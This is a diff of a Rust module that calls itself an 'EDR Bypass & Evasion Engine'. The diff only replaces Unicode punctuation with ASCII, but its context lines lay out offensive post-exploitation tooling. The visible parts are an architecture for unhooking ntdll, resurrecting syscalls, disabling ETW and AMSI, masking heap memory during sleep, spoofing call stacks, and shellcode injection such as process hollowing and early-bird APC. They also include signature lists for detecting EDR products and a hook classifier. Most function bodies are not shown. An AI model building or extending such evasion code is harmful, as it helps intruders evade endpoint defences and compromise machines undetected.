@@ -1,18 +1,18 @@
-//! EDR Bypass & Evasion Engine — next-generation stealth infrastructure.
+//! EDR Bypass & Evasion Engine -- next-generation stealth infrastructure.
 //!
 //! Before touching LSASS, injecting shellcode, or running any post-ex module,
 //! this engine assesses the EDR landscape, neutralizes userland hooks, silences
 //! ETW providers, and masks in-memory artifacts to achieve near-zero detection.
 //!
 //! # Architecture
-//! 1. **EDR Reconnaissance** — detect vendors, processes, drivers, services
-//! 2. **NtDll Unhooking** — map clean ntdll from disk, restore `.text` section
-//! 3. **Syscall Resurrection** — re-resolve SSNs from clean ntdll, indirect calls
-//! 4. **ETW Abolition** — walk provider callback list, disable all trace sessions
-//! 5. **Heap Obfuscation** — encrypt heap regions during sleep/dead-drop periods
-//! 6. **Thread Vestige** — remove thread-start notifications, spoof call stacks
-//! 7. **Process Protection** — set `PsProtectedProcessLight`, hide from ETW
-//! 8. **Injection Diversity** — early-bird APC, module stomp, process hollow, hell's gate
+//! 1. **EDR Reconnaissance** -- detect vendors, processes, drivers, services
+//! 2. **NtDll Unhooking** -- map clean ntdll from disk, restore `.text` section
+//! 3. **Syscall Resurrection** -- re-resolve SSNs from clean ntdll, indirect calls
+//! 4. **ETW Abolition** -- walk provider callback list, disable all trace sessions
+//! 5. **Heap Obfuscation** -- encrypt heap regions during sleep/dead-drop periods
+//! 6. **Thread Vestige** -- remove thread-start notifications, spoof call stacks
+//! 7. **Process Protection** -- set `PsProtectedProcessLight`, hide from ETW
+//! 8. **Injection Diversity** -- early-bird APC, module stomp, process hollow, hell's gate
 
 #![allow(dead_code)]
 
@@ -21,9 +21,9 @@ use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use tracing::info;
 
-// ──────────────────────────────────────────────────────────────────────
+// ----------------------------------------------------------------------
 //  Constants
-// ──────────────────────────────────────────────────────────────────────
+// ----------------------------------------------------------------------
 
 /// Known EDR process name fragments (case-insensitive substrings).
 const EDR_PROCESS_SIGNATURES: &[&str] = &[
@@ -175,9 +175,9 @@ const EDR_DRIVER_SIGNATURES: &[&str] = &[
 //     "{d5b2c6e1-3a4f-4d8c-9e5b-2a1f6c3e8d7a}", // Microsoft-Windows-AppLocker
 // ];
 
-// ──────────────────────────────────────────────────────────────────────
+// ----------------------------------------------------------------------
 //  EDR Detection Types
-// ──────────────────────────────────────────────────────────────────────
+// ----------------------------------------------------------------------
 
 /// Known EDR product classification.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
@@ -242,7 +242,7 @@ impl EdrProduct {
 pub struct EdrAssessment {
     /// EDR products detected (may be multiple)
     pub detected_products: Vec<EdrProduct>,
-    /// Confidence score 0.0–1.0
+    /// Confidence score 0.0--1.0
     pub confidence: f32,
     /// Detected EDR processes
     pub edr_processes: Vec<String>,
@@ -265,13 +265,13 @@ pub struct EdrAssessment {
 /// Recommended evasion strategy based on EDR assessment.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 pub enum EvasionStrategy {
-    /// No EDR detected — use standard techniques
+    /// No EDR detected -- use standard techniques
     None,
-    /// Only AMSI/ETW — standard patches suffice
+    /// Only AMSI/ETW -- standard patches suffice
     PatchOnly,
-    /// EDR with userland hooks — need full unhook + indirect syscalls
+    /// EDR with userland hooks -- need full unhook + indirect syscalls
     FullUnhook,
-    /// Heavy EDR (CrowdStrike/SentinelOne) — maximum stealth, avoid injection
+    /// Heavy EDR (CrowdStrike/SentinelOne) -- maximum stealth, avoid injection
     MaximumStealth,
 }
 
@@ -359,9 +359,9 @@ impl Default for SleepMaskConfig {
     }
 }
 
-// ──────────────────────────────────────────────────────────────────────
-//  Public API — EDR Assessment
-// ──────────────────────────────────────────────────────────────────────
+// ----------------------------------------------------------------------
+//  Public API -- EDR Assessment
+// ----------------------------------------------------------------------
 
 /// Perform a comprehensive EDR landscape assessment.
 ///
@@ -401,7 +401,7 @@ pub fn assess_edr_landscape() -> Result<EdrAssessment> {
                 ));
                 for h in hooked.iter().take(5) {
                     findings.push(format!(
-                        "  Hook: {} — {} (SSN={})",
+                        "  Hook: {} -- {} (SSN={})",
                         h.function_name, h.hook_type, h.syscall_number
                     ));
                 }
@@ -521,7 +521,7 @@ pub fn unhook_ntdll() -> Result<UnhookResult> {
 }
 
 /// Resolve syscall numbers from a clean ntdll mapping.
-/// Returns a map of function name → syscall number.
+/// Returns a map of function name -> syscall number.
 pub fn resolve_clean_syscall_numbers() -> Result<HashMap<String, u32>> {
     #[cfg(target_os = "windows")]
     {
@@ -693,9 +693,9 @@ pub struct StealthResult {
     pub errors: Vec<String>,
 }
 
-// ──────────────────────────────────────────────────────────────────────
+// ----------------------------------------------------------------------
 //  Windows-specific implementations
-// ──────────────────────────────────────────────────────────────────────
+// ----------------------------------------------------------------------
 
 #[cfg(target_os = "windows")]
 fn detect_edr_processes_impl() -> Vec<String> {
@@ -1123,7 +1123,7 @@ fn unhook_ntdll_impl() -> Result<UnhookResult> {
                 }
 
                 if !changes {
-                    info!("NtDll .text is clean — no hooks detected");
+                    info!("NtDll .text is clean -- no hooks detected");
                     result.success = true;
                     return Ok(result);
                 }
@@ -1562,11 +1562,11 @@ fn check_etw_amsi_state() -> (bool, bool) {
 /// Classify a hook by examining the patched bytes.
 #[cfg(target_os = "windows")]
 fn classify_hook(bytes: &[u8; 8]) -> String {
-    // JMP [RIP+offset] — typical EDR inline hook
+    // JMP [RIP+offset] -- typical EDR inline hook
     if bytes[0] == 0xFF && bytes[1] == 0x25 {
         return "inline_hook_jmp_rip_relative".to_string();
     }
-    // JMP rel32 — direct jump to hook
+    // JMP rel32 -- direct jump to hook
     if bytes[0] == 0xE9 {
         return "inline_hook_jmp_rel32".to_string();
     }
@@ -1578,11 +1578,11 @@ fn classify_hook(bytes: &[u8; 8]) -> String {
     if bytes[0] == 0xCC {
         return "debug_breakpoint".to_string();
     }
-    // MOV RAX, addr; JMP RAX — detour via register
+    // MOV RAX, addr; JMP RAX -- detour via register
     if bytes[0] == 0x48 && bytes[1] == 0xB8 {
         return "detour_hook_mov_rax_jmp_rax".to_string();
     }
-    // PUSH imm64; RET — push hook address, return to it
+    // PUSH imm64; RET -- push hook address, return to it
     if bytes[0] == 0x68 || bytes[0] == 0x6A {
         return "push_ret_hook".to_string();
     }
@@ -1590,9 +1590,9 @@ fn classify_hook(bytes: &[u8; 8]) -> String {
     "custom_hook".to_string()
 }
 
-// ──────────────────────────────────────────────────────────────────────
+// ----------------------------------------------------------------------
 //  PE image section header (local definition for scan_ntdll_hooks_impl)
-// ──────────────────────────────────────────────────────────────────────
+// ----------------------------------------------------------------------
 
 #[cfg(target_os = "windows")]
 #[allow(non_camel_case_types, non_snake_case, dead_code)]
@@ -1610,9 +1610,9 @@ struct IMAGE_SECTION_HEADER {
     Characteristics: u32,
 }
 
-// ──────────────────────────────────────────────────────────────────────
+// ----------------------------------------------------------------------
 //  Tests
-// ──────────────────────────────────────────────────────────────────────
+// ----------------------------------------------------------------------
 
 #[cfg(test)]
 mod tests {
